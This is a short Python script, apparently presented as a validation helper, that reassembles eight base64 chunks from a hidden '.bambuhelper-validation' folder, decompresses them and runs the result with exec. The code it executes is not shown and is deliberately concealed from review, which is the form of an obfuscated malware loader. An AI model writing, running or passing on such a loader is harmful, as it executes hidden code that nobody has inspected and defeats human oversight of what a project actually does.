#!/usr/bin/env python3
from pathlib import Path
import base64, zlib

root = Path(__file__).resolve().parent / '.bambuhelper-validation'
encoded = ''.join(
    (root / f'v11_2_workshop_tools_verified.part{i}.b64').read_text().strip()
    for i in range(8)
)
source = zlib.decompress(base64.b64decode(encoded))
exec(compile(source, str(root / 'v11_2_workshop_tools_verified.parts') + ':decoded', 'exec'))
